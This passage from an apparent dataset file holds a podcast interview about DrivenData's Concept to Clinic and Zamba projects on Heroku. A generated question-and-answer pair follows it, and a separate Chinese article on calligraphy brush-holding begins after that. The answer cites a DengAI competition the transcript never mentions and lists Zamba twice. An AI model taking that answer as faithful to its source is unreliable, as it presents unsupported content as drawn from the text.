we ran a kind of online challenge called Concept to Clinic. This was, I would say, a year or two ago, where people were kind of taking models that had been developed in a previous data science competition and actually writing software. We opened a GitHub repo kind of around the model, and we stubbed out an application that would let... In this case, it was clinical researchers who were working on detecting lung cancer from early screen scans who would take the model and then kind of move that forward by writing the software around the model so that it could be used, so that it could be fed new scans. For that competition, there was a $100,000 prize pool.\nIsaac Slavitt: A ton of people were working this. Again, you'd expect maybe people would be hoarding information and trying to work on their little corner of the project. What we actually saw was it looked like a regular open-source project. People were opening issues and discussing things and reviewing each others' pull requests. It was really nice to see.\nJonan Scheffler: That's fascinating. The whole time, you're moving forward cancer research. You're providing early detection software to cancer researchers. These clinicians, they don't necessarily have the coding ability to put together these models or get them online, but you are making it accessible to them. Not only are you setting up the model, but you're providing a web application template that someone could deploy on a place like, for example, Heroku. I don't know if you've heard of Heroku. They're pretty great. You could put this application online there, and then the clinicians have ready access to the research.\nIsaac Slavitt: That's right. What we were trying to do here was develop a proof of concept, and we were working with the Addario Lung Cancer Foundation, which is a major lung cancer research and funder in the United States. We have a ton of respect for them. They're very forward thinking in what sorts of research they fund in addition to very traditional clinical research.\nIsaac Slavitt: Competitions are awesome. They get a ton of engagement, and they really get to sort of the state of the art. It's hard to beat when you have all sorts of individuals with academic backgrounds and practitioner backgrounds who are working on a hard problem and trying all sorts of different things. You really explore the solution space, so you can be pretty confident that what you end up with at the end is probably as close as you can get to separating signal from the noise.\nIsaac Slavitt: What happens, though, is a model is just a bunch of files in a folder with the source code that made them, and so it's a huge, huge challenge to get good models, but it's also a sort of interesting problem to work on where you take models and you try to make it happen. You have to write the software so that people can use them.\nJonan Scheffler: The example that I initially found when I was looking at Driven Data was a project called... It's called Project Zamba, I think. I wonder if you could tell me more about that.\nIsaac Slavitt: Sure. Project Zamba started with a competition, and the idea behind the competition is that a lot of researchers who are looking into environmental conservation and animal behavior rely on footage gathered by camera traps. These are little motion detector-activated cameras that researchers can put up in trees or other kind of manmade structures.\nJonan Scheffler: Some kind of hideout in the forest, and I park this along a trail and wait for something to move. It turns on and gives me a short clip of video that I review later, right?\nJonan Scheffler: You're literally just watching hours and hours of footage and tagging, all right, at a minute 35, there was a pangolin, right? Manually.\nIsaac Slavitt: That's exactly right.\nJonan Scheffler: That could take a long time to accrue data, I imagine, but you had a pretty significant set when you launched this competition.\nIsaac Slavitt: Yeah, we had a big set of data. The thing about these camera traps is that if you keep them out there, you get a ton of information. It actually becomes a kind of a race. How quickly can you label all of these videos? More keeps coming in, so this is one of those things where, for years, people have wanted to automate this in some way, but either the algorithms or the hardware weren't up to the task. We're finally at a place where it makes sense to see whether a lot of this classification work can be pushed to the computer first and then just verified by a human.\nJonan Scheffler: I think you told me there were 300,000 clips in the initial data set. Is that right?\nIsaac Slavitt: That's right. Yeah, 300,000.\nJonan Scheffler: The 300,000 clips were already classified manually by people, but even if for a new clip, you were only able to tell me if it was an animal or a human... which I know that I am oversimplifying things, but in my brain that is not a data scientist brain, that seems like a relatively easy classification problem as compared to identifying the difference between a raccoon and a pangolin, for example, which is in fact exactly what you have done.\nJonan Scheffler: Your winning models are able to classify a set of species specifically out of any given clip. I can upload a video now and find out if there's a pangolin in it. Am I correct?\nIsaac Slavitt: That's exactly right, but there's actually one win that's even easier that's a little bit further upstream. The first task is figuring out whether the videos have an animal at all or whether it's just kind of background motion. That's something that is actually pretty doable with computer vision. It's not necessarily the kind of thing where you need a deep neural network.\nIsaac Slavitt: Certainly, deep neural networks are good at that, but that's the kind of thing where people have been doing that for a little while, but in order, like you said, to classify between a raccoon and a pangolin, which are both... they can be about the same size and have, if you're squinting or it's dark, roughly the same kind of outline, that's really hard to do with traditional deterministic methods. That's where we're just at a point where the best-performing neural networks do very well at that and close to what a human would just do by looking and classifying them manually.\nJonan Scheffler: When you were talking about doing this without machine learning, if I were to take kind of still images of these animals... I have a silly example, maybe, from my career on the speaking circuit. I go around to these Ruby conferences, and I talk about my silly projects. One of them was a terrible, terrible, do-it-yourself home security system that used a Raspberry Pi. It would just snap a still image every second, and it would then turn that image into a set of zeroes and ones by some method.\nJonan Scheffler: It actually would minify that, and I would end up with this 64-bit hash of what image was. I could then use... That's called perceptual hashing that I was using to reduce this down to this 64-bit number, and then I would use the Hamming distance of those numbers to tell the difference between to images. Obviously, being able to accomplish that without the machine learning piece doesn't take away the value of having not only these models up there but the tools to use them. Even if we know how to accomplish those things easily, as you said, without the machine learning piece, it's still not accessible to the researchers, so the information is invaluable.\nIsaac Slavitt: Yeah. You could get pretty far using more traditional computer vision methods. People have been working on these and perfecting them for a very long time, but there's a jump after that where your computer vision will kind of plateau, and you need a more kind of probabilistic model that can learn from data. It's hard once you start bumping up against the fundamental limitations of the data you have, like if you think about two pictures that are kind of in the dark that have similar-looking animals. It's not clear how you could just use a filter or a hash to try to figure out which is which. That's where you just need to have it look at a ton of different examples and build its own features so that it can classify better in the future.\nJonan Scheffler: This is why I think the future looks bright, maybe, for data scientists from Harvard, for example.\nIsaac Slavitt: I like to think so.\nJonan Scheffler: I think you may be employed for some time to come, Isaac.\nIsaac Slavitt: We've been reading articles like data scientist is the sexiest job of the 21st century and things like that for a while. I love that this skillset is getting more attention. I think that it's actually more that the general public's attention to quantitative methods has started to catch up. My undergraduate major was operations research, which is not something that a whole lot of people have heard of, but really it's just sort of applied math applied to kind of real-world business problems.\nJonan Scheffler: Like operations problems inside of a corporate, or I've got a factory, and you're doing optimization somehow.\nIsaac Slavitt: Yeah. The history of it goes back to World War II, where people were trying to figure out, given certain constraints on fuel and distance, where do I put my planes and all sorts of tasks like that, and then if you think about any kind of company that deals with constraints and optimization. Just think about UPS or FedEx. They're just a fractal of these problems. The closer and closer you look at what they need to do and figure out and optimize, everything becomes an optimization problem, so that's going back to the 1940s, that sort of tool set.\nIsaac Slavitt: Statistics is a much older field, and people have been using applied statistics for a very long time, so all of that was a kind of roundabout way of saying data science is a newish term, but it's really an umbrella term holding a lot of different fields. I do think it's special when you take kind of traditional quantitative analysis tools and you also combine that software and computer science skills. That's where a lot of the power comes in, when you're working with workplaces where everyone uses a computer, but some of this is just the terminology catching up to what has been important for a very long time.\nJonan Scheffler: Now, we also have the technology to catch up as well, right? We have these cloud computing platforms that are capable of handling incredibly large workloads. I have a friend who works at Google, another developer advocate over there, who just recently calculated a new world record for digits of pi using these cloud platforms that are now available, which is not something that could have been accomplished before. The pace of innovation around these platforms, and now you have GPUs available for you all the time to run your machine learning and train up your models. It's a brilliant and bright future, I think, for data science and for software. I'm looking forward to seeing where things go.\nIsaac Slavitt: Yeah, and I think it would be difficult to overstate how important it is that open source has exposed so many people to these tools. It used to be the case where if you wanted to work on a GIS system, or you wanted to work on a good relational database, or you wanted to work on time series forecasting, you had to really get a job at one of the companies that either built these tools or had a $100,000 license to use them.\nIsaac Slavitt: The democratizing effect of open source, and not just open source but now having platforms like Heroku where you can create a free account and experiment with getting your stuff out there, or if you need to run a computation, there are platforms where you can run very computationally expensive code that previously you could only do if you were really a graduate researcher at an institution that owned a cluster. I think that has really pushed the field ahead quite a bit and opened it up to a lot of people who wouldn't have been able to participate before.\nJonan Scheffler: I do want to ask you a little bit about the infrastructure there at Driven Data. So far, we've talked about hosting your models on Heroku. Now, when you're training a model, this is a pretty specialized task, and there are specialized services for doing this, for example TensorFlow. I come away with my trained model, and I can put that up anywhere, for example in the Zamba use case to allow researchers to upload their videos and find out if there's a pangolin in them. You've seen your users using Heroku for that. Is that correct?\nJonan Scheffler: I'll take a data set, and I'll run maybe 80% of my data through with the input and the output both present so that my model adjusts it weights to the existing identification. Then, the remaining 20%, I'm allowed to use to test my model then, or it gives me the opportunity to use to test my model, right?\nIsaac Slavitt: That's right, and so the process of finding those weights, when you really boil down most statistical modeling, we're just trying to get a bunch of numbers that either push a prediction into a certain class, or push it towards a yes or a no in the case of binary classification, or try to find a certain number in the output. It all comes back to just finding these weights, but the optimization algorithms that you need to run to find those weights when you're feeding the model new examples, that can be extremely expensive to do. Once you have the weights, it's generally just a process of feeding in the input, plugging it in, and then you get out your answer.\nJonan Scheffler: To your point, then using that data becomes much, much less expensive, because you're just putting the trained model up on a site like Heroku, and you're only paying us whatever you're paying for your dynos and your database, right?\nIsaac Slavitt: That's right. To bring this example back to your question, we talked about the Zamba competition where people were looking at trying to take these videos of animals and classify them into what exact species it was. At the end of the competition, the organization was interested in developing that further. It's great to have the model, but they wanted people who aren't machine learning researchers to be able to take their new footage, plug it in, and get out a spreadsheet so that would kind of fit into their current workflow of how they assemble their research data.\nIsaac Slavitt: We posed a question to our team. \"How might we build a system that's a thin wrapper around this machine learning model that has an intuitive user interface so that researchers can just sort of upload their videos and get out spreadsheets of predictions?\" They don't have a strong preference as to what output it's in. They just need to be able to work with it, and everybody knows how to work with spreadsheets, if that makes sense.\nJonan Scheffler: Well, and more than that, they're able to write little formulas into their spreadsheets to further extrapolate on the data. This is part of the value of things. I think these interstitial products that kind of glue companies together, you see a lot of startups around this space where small software companies have problems finding docs, internal documents, and so a lot of these startups built these intermediary services that simplify this process.\nJonan Scheffler: Dataclips is a very good example of this kind of thing where I as a developer, I have access to the database, and I can get into the data, but it becomes quite a task for me when everyone on the team needs business intelligence data, and they've got to come to me, and I've got to write these things. If I could just drop a bit of SQL into a website that then they can tweak a little bit, they don't have to come back to me if they decide they also want to search New York. They can just add it to their query, and it empowers people in the organization to kind of shift the load of work around.\nIsaac Slavitt: That's exactly right, and we've actually used Dataclips in that way. Since we use Heroku Postgres for our hosted database, we can connect this. For people who aren't familiar with the tool, there's a kind of clean user interface where you can put a SQL query, and then you can see the results below, and you can export it as a spreadsheet or a variety of different ways, I think.\nIsaac Slavitt: When we've had partners say, \"Hey, we want to see where the leaderboard is as of today,\" we don't want to write custom code to do this all the time, and we don't want to go in and poke around in our production systems, so it's nice to have a dataclip that we can just grab a quick download and send over to them.\nJonan Scheffler: Yeah. I love Dataclips. I actually didn't know of the existence of that product before I came to work at Heroku, but it has been incredibly valuable to me. Tell me a little bit about the structure of Driven Data's applications. You have drivendata.org, the actual web application. Is that a Rails app?\nIsaac Slavitt: It's a Django app.\nJonan Scheffler: Okay. This makes sense to me, of course, and should have been my first guess, because if I am not mistaken, the machine learning community is all but entirely dominated by Pythonistas. You don't think that's true anymore, maybe?\nJonan Scheffler: Is it changing?\nIsaac Slavitt: I think it's... No, I think it's going in that direction. I would say it's probably predominantly the Python/PyData ecosystem. There are still a whole lot of very serious users of R in the data science world, especially people who are in research or academia. R is very popular among data scientists who have more of a statistics background, but especially with tools like TensorFlow and Keras being very Python-centric, I would say that the majority of at least the AI, if not most machine learning or data scientist practitioners, have been moving in the Python direction.\nJonan Scheffler: I think I spoke to some data scientists once who told me that they would write... They would come up with their models in Python, but then they would port them to Java so that they could run more quickly on the JVM in order to train up their models. Does that pattern still apply?\nIsaac Slavitt: Yeah. I think there's an interesting trend in our field where at first, you kind of just had data scientists, which pessimists were saying was just a rebranding of other titles. I think there's a legitimate truth that a lot of the skillsets are older than the term data science, but five years ago, a data scientist was doing everything, so they were doing the exploratory data analysis, building models, and then trying to figure, maybe, how to get this working in production in some way. Either that, or their work would end once they built the model, and then they throw it over the wall, and the traditional software engineering structure would have to pick that up and run with it.\nIsaac Slavitt: Now, especially in the last, I would say, two to three years, we're seeing more and more organizations have data scientists and data engineers who sit between in the data scientists and the software engineering stuff. The data engineer's job is to get data out of all of these varied systems into a format that the data scientists can use, then also help convert the resulting research code, really, that comes from the data science process to be more like production code.\nIsaac Slavitt: This is very organization specific. Some organizations just have software engineers who do a little data scientist. Some have very clear firewalls, and the data scientists just finish up, and then throw it over the wall. Some organizations have a sort of hybrid structure where data engineers bridge that gap, or they push the responsibility to the data scientists to get up to speed on their software best practices so that their work can be more directly adopted into the engineering organization.\nJonan Scheffler: You are using Heroku to ship drivendata.org, and the Zamba project uses Heroku to host the model. Is that correct?\nIsaac Slavitt: Yeah. The Zamba project hosts the web application and the database and the queuing layer on Heroku. The only part that isn't on Heroku is the compute task which runs the model outputs, the model predictions, and that happens on a service called Paperspace which provides sort of ephemeral containers that are specially suited for GPU-enabled, compute-intensive tasks. The entire kind of platform is on Heroku. The only part that gets computed elsewhere is the GPU-intensive prediction part of it.\nJonan Scheffler: You're using these Paperspace instances. Is it more of like a function as a service style platform? Are you just giving it a bit of code to run, or are you configuring and setting up a server yourself?\nIsaac Slavitt: Yeah, it's sort of... They have a few different offerings, and I don't want to try to sum up all of them. I'm not totally familiar with all. They have some offerings that seem to be more kind of permanent computing environment, but the one that we're using is, I believe, called Gradient, and it's for these kind of batch jobs where you just need some compute at a certain term.\nIsaac Slavitt: It's a little like a function as a service, so you give it a container. It knows how to run that container. It has whatever new inputs you're giving it, and then it puts the outputs wherever you want. For us, we ingest those back into the web application so that we can display those outputs in a helpful way for researchers and let them kind of manipulate that data and export it.\nJonan Scheffler: At some point, an API call comes back, and you said about making a spreadsheet for someone.\nIsaac Slavitt: Yeah, that's exactly right. The way it works is, let's say I'm a researcher at Max Planck Institute, and I just got my new batch of videos back from the field. What I want to do now is I want to get these all classified, so I go on Zamba Cloud. I either upload the files directly if they're small enough, or I point the web application to an SFTP server that has all of the files. Then, the application takes all those files, copies them over to Amazon S3, which is where the data is stored. Then, it kicks off a job, one of these compute jobs on Paperspace we were just talking about.\nIsaac Slavitt: At that point, what we kind of need to do is asynchronously babysit a process that is happening elsewhere, so we have this Heroku scheduler script that on a certain heartbeat will ask Paperspace, \"Hey, which jobs do you still have running, and what status are they? Have they succeeded? Have they failed,\" so that it can update our state on the web application side.\nJonan Scheffler: You're basically using promises just as API calls to connect to an SFTP server, get the data up into S3. Then, when the API tells you that your job is finished, get that data back and put into a spreadsheet. It's simple, really. It's just that that you have to do.\nIsaac Slavitt: Yeah, that's exactly right. We even use that sort of promises concept in the application. What we call the Heroku scheduler script, its job is to poll, so it's trying to update the state of these long-operations that it doesn't have any visibility into directly.\nJonan Scheffler: That's interesting, but Paperspace being a very specialized tool sounds like it's exactly what you would want to use for this thing, so that's a good thing to keep in mind. You've got this Django app for Zamba running up on Heroku, and you mentioned that you're using Postgres. Is this the database that you use across your applications? As far as Driven Data is concerned, Postgres is the one true database.\nIsaac Slavitt: That's the one true database. I'll fight anyone who says otherwise.\nJonan Scheffler: I have actually offered to fight people live on the floor at Dreamforce. As I'm giving a demo in their booth, I said, \"Postgres is the one true database. It supplants all other databases. Come fight me.\"\nIsaac Slavitt: Yeah, and I'm not a database expert, but some of those advanced features, it just feels like we couldn't live without. The JSONB fields, we make heavy use of in the Zamba application because we have our own database representation of these processing jobs and predictions and all of those things, but it's also occasionally important to us to look at the last payload that we got back from the API. It's just awesome that all we have to do is stuff that into a JSONB, so there's no... These days, you don't really have to choose between structured or unstructured, or SQL and NoSql. You can kind of have the best of both worlds, especially if you use a modern database like Postgres.\nJonan Scheffler: I 1,000% agree, and this is actually almost becoming a best practice for me in my applications where I do store my API payloads. It's so useful when you're trying to debug across a service-oriented architecture. I've got multiple applications in my microservices architecture, and I'm trying to debug a request across each of those. Having the actual payloads that were returned from the various APIs stored in a JSONB field is incredibly valuable, and I do try to set it up for at least all of my lower-volume API calls in my applications. It's super useful.\nIsaac Slavitt: Yeah. To be honest, I think Postgres is not the only relational database. I think at this point, if you choose any of them, you're probably fine. They have a good amount of parity these days. What I think is funny and kind of my favorite genre of post on Hacker News or other places where developers talk about stuff is when people are about to start a new business or something, and they're talking about using the hot, new event-sourcing data scheme or something like that, a true big-data problem that Google is grappling with when they don't even have five users whose data they need to store yet. I kind of think that that's like the Dilbert cartoon of our time.\nJonan Scheffler: Any other interesting corners of the Heroku platform you want to... anything you feel like you're doing is maybe novel you want to share with us?\nIsaac Slavitt: I have to be completely honest in saying that nothing that we are doing on Heroku is novel, and I consider that a good thing.\nJonan Scheffler: I agree with you. I agree with you. I was thinking this earlier when you were talking about the database, that people are lining up to use these new technologies and these new tools, and a lot of times, we're reinventing things that already existed, or we're making small, progressive steps forward. It's not necessary to jump to the newest, hottest thing all the time.\nJonan Scheffler: Use boring technology. I used Heroku long before I ever worked here, because I never thought about it ever. It would run my application, and occasionally I'd get an email, and it would say, \"Hey, there was a critical error with your database. Everything went to hell, and your whole production database was deleted, but we saved you, and here's your email letting you know that we restored it from backup while you were sleeping. Now, you have no further obligations to pursue.\" That is the kind of technology that I want.\nIsaac Slavitt: Yesterday, I got an email that said, \"Hey, did you know that one of the indexes on your primary production database is corrupted from the application layer? Hey, by the way, the way you fix this is you just run this command.\" I ran that command, and it worked out well.\nJonan Scheffler: See, this is exactly what I need more of in my life. So much of my day is just figuring out what obscure bug I've managed to encounter. My worst days as a developer are when I spend my first four or six hours of the day screwing around with my development environment, everything's broken, trying to get my pipeline set up so that I can ship my applications effectively. There are so many things that will already go wrong with your development environment. Simplify the pieces that you can. Use boring technology.\nIsaac Slavitt: We've had people say, \"You could just have a co-located server somewhere, and you could do this, that, and the other thing.\" I always say, \"I know my limits. I'm not a dumb person on my good days, but I don't really want to be responsible for applying critical security updates to 8,000 components of this Linux system running somewhere in the cloud that I don't really understand, so why don't I focus on the data science and software development parts and let somebody smart take care of the rest?\"\nJonan Scheffler: I love playing around with security, but I'd never trust myself to harden a production server. The idea is just crazy to me.\nIsaac Slavitt: You don't want to play with security. You don't want to put your living in jeopardy dealing with that if you're not a security expert.\nJonan Scheffler: Exactly. Exactly. Well, Isaac, I think I have mostly run out of things to ask you about. Actually, that's never going to be true, because I am fascinated by Driven Data, and I'm going to keep watching these competitions. I'm looking forward to a day where I know enough machine learning that I can dabble in some of these, because I'm really impressed by the work you're doing. Again, I applaud you for your commitment to open source. I really, really appreciate that you're releasing these models under the MIT license specifically, my favorite license, the set-and-forget open-source license that actually contributes back to the world and lets people use it however they want.\nJonan Scheffler: You're doing great work, Isaac, and I thank you so much for joining me. I really appreciate your time.\nIsaac Slavitt: My pleasure, and thank you for supporting the Zamba project with the Heroku credits that you gave us.\nJonan Scheffler: I am happy to do it, and we will continue supporting Zamba as long as we are able. For science.\nJonan Scheffler: Have a good day, Isaac. Bye-bye.\nIsaac is a co-founder and data scientist at DrivenData. He holds a master's in Computational Science and Engineering, and a BS in Operations Research.", "question": " What is DrivenData and what are some of the real-world problems that it has solved using data science competitions?", "answer": "\n        DrivenData is a platform that uses data science competitions to solve real-world problems. Some examples of problems it has solved include:\n        - Using AI to classify animal species in African forests without disturbing the natural ecosystem (Zamba competition)\n        - Using machine learning to predict future outbreaks of dengue fever (DengAI competition)\n        - Automating the process of labeling videos of animals in camera traps to aid conservation efforts (Zamba competition)\n        - Developing software to detect lung cancer from early screening scans (Concept to Clinic competition)\n        DrivenData solicits help from data scientists by running \"competitions\" where teams are asked to comb through data sets to solve real-world problems. The competitions offer cash rewards for the best solutions. By using data science competitions, DrivenData is able to harness the power of crowdsourcing to solve important problems that have a real-world impact."}
{"text": "[转载]笔法九家谈\n原文地址:笔法九家谈作者:欧楷墨香泪鱼儿 编者按:\"执笔、用笔\"是书法创作的核心问题,当代书法经过近30年的发展,再回头来讨论笔法问题,很有必要。为此,本报特邀在书法创作上有一定成就的专业人士就\"执笔、用笔\"及相关的问题作集中讨论。 一、五指执笔、三指执笔、握管抓笔及其他执笔方法,各有何优劣？你在创作中常用哪一种执笔方法？ 马世晓:对于执笔,历代书家众说纷纭、各抒己见,总结出了很多执笔方法。诸如\"拨镫法\"、\"单钩\"、\"双钩\"、\"龙眼\"、\"凤眼\"、\"五指执笔法\"、\"四指执笔法\"、\"三指执笔法\"、\"回腕法\"等。其中,五指执笔法对后世影响最大,据说此法传于二王,由唐人陆希声作了进一步的阐释。五指执笔分别有擫、押、钩、格、抵五字诀,大意是要五指齐力,力聚管心,各司其责。近人沈尹默,对五指执笔所论甚详,认为其是最科学、最合理的执笔方法,其说在当代书坛影响颇大。 对执笔最早的研究,见诸唐代的几位书法家与书论家,如欧阳询、李世民、张怀瓘、韩方明等,他们首倡\"指实掌虚、腕平掌竖\"之说,为后世书家所公认,成为执笔的原则。\"指实\"即五指贴管,力聚管心,便于臂腕之力达于毫端。\"掌虚\"即手掌空虚,笔在指端,指不入掌,挥运自然,灵活自如。执笔还有\"腕竖则锋正,锋正则四面势全\"的至理名言。对执笔方法的论述,我十分赞同苏东坡\"把笔无定法,要使虚而宽\"的见解。苏东坡认为执笔要强调掌心空间的宽阔,能使笔势往来获得最大限度的灵活性。\"虚而宽\"也是\"掌虚\"的意思,没有新鲜之处,其高见在于\"无定法\"。执笔方法本身有很大的自由度,不可执一而定。\"握管法\"就很能说明这一问题。握管法亦名握拳法,即以五指聚合成拳状握笔,食指至小指均在掌中心,占据掌的绝对空间,紧握笔管。此法与世代相传的\"掌虚\"原则相反,是\"掌实\"。我曾尝试用此法写过大、中、小行草书,中、小字用提腕,大字用悬腕。用此法,四指中节握管,颇觉沉着有力,与正常书写相差无几。写熟练了,估计效果还会更好一些。此法因四指紧握笔管,没有活动余地,书写时不存在运指,提腕写中、小行草时,全靠运腕书写(大字用悬腕以肘臂助力书之),精微之处,亦觉随心。\"握管法\"颠覆了\"掌虚\"的原则和主运指之说,给\"执笔无定法\"提供了鲜活有力的例证。 历代相传的各种执笔方法的创立者,所道都能自圆其说。我想,一方面是在长期的书写实践、亲身体验中所总结出的心得体会,确信自己执笔方法的正确性；另一方面可能是他们应用自己所创立的执笔方法达到��分娴熟的程度,熟能生巧,即使执笔方法不是十分合理,但运用熟练后就能得到(某种程度上得到)纠正,而变得合理了。于是乎,至今仍有一些不甚正确的执笔方法被使用,这可能是\"执笔无定法\"得以成立的深层原因。执笔无定法,也不是怎么执都可以。如\"回腕法\"就不可取,此法臂腕都\"回\"到胸前,掌心向胸,有违人的生理机能,不宜采用。何子贞用此法写得十分辛苦,他自己说:\"每一挥写辄汗流浃背\",写字变成了\"受罪\"。这是他的失策。我想,如果他不用这种执笔方法,书法成就可能会更高。 我4岁学书,从父亲教我执笔到青年自学书法,一直没有留心执笔的问题,直到从事书法教学后,留心书论才知道,我写字执笔用的是五指执笔法。以我的执笔方法对照陆希声所阐述的理论和沈尹默对五指执笔法的详解,没有多大差别。父辈教我及我见到的一些书法前辈的执笔方法,多用此法,已广为当下书家认同,当前书法界运用此种执笔方法相当普遍。我从幼年至今,创作都用五指执笔法。对于执笔方法,我向来不甚在意,也未作过深入的思考,认为执笔不是大问题,只要能适意、自如地使笔随意转,就达到了执笔的终极目的了,我不太认同那些炫奇弄巧、故作高深的执笔高论。如包世臣为了给自己执笔的\"捻管理论\"找到\"权威根据\",竟将刘墉书僮那里打听来\"(刘墉)使笔如舞滚龙\"的无稽之谈奉为圭臬。又说张照作书用绳子架其右肘云云,不一而足。无论此类方法的真实性如何,都是不惟自误、抑或误人之事,包氏将其载入《艺舟双楫》,为后世徒添笑柄而已。 丁申阳:对执笔方法,早有争论,但古人有执笔无定法的论断。现在的书家多用五指执笔法,书法启蒙教育也是以此教授的。五指执笔适宜写楷书、隶书、篆书,因用笔垂直稳当,容易写出中锋的线条,而中锋的线条正是这些书体的基本要求。传说王献之写字时,其父王羲之在背后试图将笔拔掉而不果,说明王羲之是主张紧握笔的。从二王传世的作品(包括后人的摹本、假托本)来看,其线条的质感、起承转合都给后人树立了楷模,历代大书家多以他们为榜样。由此看来,五指执笔法具有广泛性、科学性。 三指执笔法也有人运用,其握笔相对较松,所以写出的线条轻松灵活,有时还会产生意外的效果。日本书家多用三指执笔法,他们写字落笔露锋居多,转折处多用方折法。三指执笔更适用于行、草的书写。其实,将笔在纸上横拖竖抹,抒发性情时,就顾不上什么执笔方法了,配合手腕的灵活运用,用任何执笔方法,都是可以写字的。 握管抓笔,是写大字榜书时使用的,适合写笔画粗壮、结体方正的大字。这种握笔方法有表演的成分,展示的是一��书写的尊严,若用这种握笔方法来写小字则行不通。 我几乎全以五指执笔来写字,初学书法时,老师所教的就是这种执笔方式,如果不照着做就有可能会中断学书生涯。有一定的基本功后,我也曾尝试过三指执笔。有一个阶段写张瑞图的草书,我就是用狼毫笔三指执笔所写,很顺手。第三届全国书法篆刻展上,我的入展作品就是用这种执笔方式写的。 季伏昆:检索文献,可知古代书家很重视执笔方法。在传为卫夫人的《笔阵图》中,就有\"凡学书字,先学执笔\"之言。唐代的虞世南、李世民、孙过庭、张怀瓘、韩方明,宋代的苏轼、黄庭坚、米芾等,皆对执笔有所论述。有\"拨镫法\"、\"把笔四法\"、\"执笔八法\",到\"二指搦管\"、\"三指捻管\"、\"四指争力\"、\"五指齐力\"等,言人人殊,莫衷一是。清代梁■《执笔歌》,高唱\"学者欲问学书法,执笔功能十居八\",对执笔方法的重视又过分了。就笔法而言,运笔调锋更为重要。 20世纪60年代,我有幸亲眼目睹书法界前辈作书,如沈尹默、胡小石、刘海粟、潘天寿、林散之、陆维钊、沙孟海、萧娴、高二适、傅抱石、李可染及赵朴初、启功等先生,其中不乏大师、名家。他们大多用五指执笔法,个别先生用三指或四指执笔法。当然,同样用五指执笔,由于手指的长短、粗细等生理差异,具体的执笔动作与指掌形态也存在一定的差别。如执笔的部位有高低、指尖的距离有远近、手腕的朝向有正侧、掌中的空间有大小、拇指的指节有突收、笔杆的控制有紧松等。诸位前辈执笔虽有差异,但皆遵循\"指实掌虚\"之理。 再者,因书家所书书体、尺幅、毛笔毫颖软硬不同等因素的影响,我辈今日很难判断前人所总结执笔方法孰优孰劣。学书之人,不必囿于前人成见陈说。作书只需选择与自己生理、心理特征相合、相和的执笔方法即可。作书时,感觉执笔\"称手\"不别扭,毛笔与手指能连为一体,便是最适合自己的执笔方法。我曾师事高二适和林散之先生,两位老师都曾用五指执笔法(高二适终生用五指,林散之72岁前用五指、其后因伤改用三指)。受老师的影响,创作中我用五指执笔法。 沃兴华:元代书法家郑杓在《衍极》中说:\"执笔者,法书之机键也...夫善执笔则八体具,不善执笔则八体废。\"执笔正确与否,直接关系到创作效果。因此历代书家都很重视执笔,尤其在字体书风发生重大变化的历史时期,相关的研究和论述特别多。东汉蔡邕说\"惟笔软则奇怪生焉\",就隐约地透露一丝执笔、用笔变化的信息。魏晋时期,分书发展为楷书,章草发展为今草,由于书风的流变,各种各样的实践产生了各种各样的执笔方法。卫铄《笔阵图》说:\"执笔有七种\",但语焉不详,没有具体��明。唐代桌凳逐渐取代几案,写字姿势不同,视角不同,执笔的方法也发生了变化。唐代韩方明在《授笔要说》中总结出六种执笔方法,并且加以具体解说,形成理论,对后世影响颇大。清代,帖学衰微,碑学兴起,为了写出苍茫浑厚的点画、线条,用笔方法必须改变,执笔方法也要调整。因此,怎样执笔又一次成为当时书家关注的焦点,出现了各种各样的探索结果,什么提斗法、冲禁法、回腕法、捻管法等,甚至还出现过一些匪夷所思的\"秘法\"。 执笔方法,各有所长、各有所短。前人常常是各执一端,相互排斥。任何一种执笔方法,都是为了适应不同的书写方式、追求不同的书写风格而产生的,盲目排斥有碍创作效果。应正确分析它们各自产生的原因,在知道所以然的基础上,发挥它们的用武之地。 现就几种常见的执笔方法,作一番探究。唐代韩方明的《授笔要说》总结了六种执笔方法:双指苞管法、单指苞管法、■管法、撮管法、握管法和搦管法。双指苞管法,韩方明认为其是最重要的执笔方法,称为\"第一执笔\"。这种方法用\"双指苞管,亦当五指共执,其要实指虚掌,钩擫讦送\"。双指苞管法就是今天最流行的五指执笔法,沈尹默先生为此疏证:\"双苞就是双钩,是说食指和中指两个包在管外而向内钩着, 共执 是说大指向外擫着,食、中两指向内钩着,无名指向外揭着或者说格着,小指贴住无名指下面,帮着送着,五个手指都派上用场。\"潘伯鹰先生在《中国书法简论》中解释说:\"右手大指内端扣住笔管,有如擫笛之形。食指与大指相对扣住笔管,为 押 。中指靠在食指之下扣住笔管,以增其力,为 钩 。无名指爪甲从下边的对面挡住笔管,其方向与大指略同而仿佛是大指与食指之间所成角度的对角线,这叫做 格, 格 者挡住之意,挡住笔管不至因食指与中指的力量而偏侧向右边也。小指靠在无名指下,以同一方向,挡住笔管,增强其力,这叫做 抵 。\" 沈、潘两位先生的阐述,我觉得从追求稳实的原则出发,五指执笔最理想的状态应是把五个手指头的力量并成三股,等分地作用于笔杆。具体来说,拇指为一股,食指与中指并列为一股,无名指与小指重叠为一股。俯视这三股力量对笔杆的作用情况,有些像车床的三星夹头。用这种方法执笔,手指的分布十分自然,每一个方向的作用力都有另外方向的反作用力来平衡,笔杆稳实,要行就行,要止则止,一点也不生硬勉强。 单指苞管法,沈尹默先生认为:\"单苞就是单钩,是用大、食、中三指执管,食指从管外钩向内,中指用甲肉之际往外抵着,其余二指衬贴在中指下面。\"单指苞管法类似于现在的钢笔执笔法,与双苞法相比,区别在于将中指从笔管的外侧移到笔管的内侧,力量由从外向内压变成从内向处顶,使垂直的笔杆变得向外倾斜起来。 ■管法、撮管法的执笔方法完全相同,都是五个手指合围在笔管的顶部,将笔管末端包裹在掌心之中。这种执笔方法的腕特别松、特别活,适宜写草书。细分的话,■管法是\"起草稿用之\"、\"吊笔急疾\",书写面是水平的,笔杆是垂直的。撮管法\"书图障用之\",书写面是垂直的,笔杆是水平的。握管法执笔,将笔管一把抓在掌中,以肘运笔,特别有助于\"发力\"、\"壮气\",用于写大字,是一种特别的方法。六种执笔方法中,韩方明只承认双指苞管法,认为其\"妙无所加也\",对其他各种执笔法一概否定,指出种种不足,或\"力不足而无神气\"、或\"全无筋骨\"、或\"实为世所笑\"。总之,皆\"流俗用之\",\"非书家者流所用也\"。我认为,双指苞管法是唐以来最实用的执笔方法。但因此而说其他执笔方法都不正确,那就缺乏分析,值得商榷了,因为它们之所以产生并且能够流行,都与特定的历史时期、特定的书写工具和书写方式有关。从实用的原则出发来讨论执笔问题是一种正确的思维方式,尤其在被多种执笔方法搅得一头雾水的情况下,更要抓住要害,直接切入问题的本质。 